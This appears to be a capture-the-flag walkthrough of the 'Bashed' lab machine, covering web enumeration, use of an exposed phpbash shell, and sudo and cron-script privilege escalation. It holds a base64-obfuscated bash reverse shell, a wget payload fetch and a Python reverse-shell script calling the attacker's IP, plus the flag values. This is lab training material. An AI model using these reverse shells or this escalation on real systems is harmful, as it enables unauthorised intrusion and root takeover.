
Target : 10.129.36.187 

Started off with the port scan : 80

Enumerating Port : 80

`gobuster dir -u "http://10.129.36.187" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`

```
.htaccess            (Status: 403) [Size: 297]
.hta                 (Status: 403) [Size: 292]
.htpasswd            (Status: 403) [Size: 297]
css                  (Status: 301) [Size: 312] [--> http://10.129.36.187/css/]
dev                  (Status: 301) [Size: 312] [--> http://10.129.36.187/dev/]
fonts                (Status: 301) [Size: 314] [--> http://10.129.36.187/fonts/]
images               (Status: 301) [Size: 315] [--> http://10.129.36.187/images/]
index.html           (Status: 200) [Size: 7743]
js                   (Status: 301) [Size: 311] [--> http://10.129.36.187/js/]
php                  (Status: 301) [Size: 312] [--> http://10.129.36.187/php/]
server-status        (Status: 403) [Size: 301]
uploads              (Status: 301) [Size: 316] [--> http://10.129.36.187/uploads/]

```

While looking for `/dev`, it reveals `phpbash.php and phpbash.min.php`

phpbash.php is running, a interactive shell, i executed `echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjQxLzQ0NDQgMD4mMQ== |base64 -d |bash` to gain the shell access

```
www-data@bashed:/home/arrexel$ cat user.txt 
e7b378c7829dc0e61b84427f00505fe3
```

```
www-data@bashed:/etc$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

`sudo -iu scriptmanager`  (Got shell as scriptmanager)

In the / root directory found a folder called `scripts` where the user scriptmanager can access it and found something suspicious, where there is a python file -test.py writing a content in test.txt (which is owned by root). Lets check any running processes by root. 

I used `ps aux | grep root` and got nothing interesting. 

Let's use pspy to monitor process.

`python3 -m http.server 8080`

`wget http://10.10.16.241:8080/pspy64`

![](../Pasted%20image%2020260720164617.png)

Actually, a `root` process executes a python file in scripts folder for every minute. Let's use this escalate to root.

```shell.py
import os
import socket


rhost = "10.10.16.241"
rport = 1234

s = socket.socket(2, 1)
s.connect((rhost, rport))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

os.execve("/bin/sh", ["/bin/sh"], {})

```

![](../Pasted%20image%2020260720165936.png)


```
root@bashed:/root# cat root.txt
cat root.txt
e5153b112db7069dbc3002b44b4fb2dc
```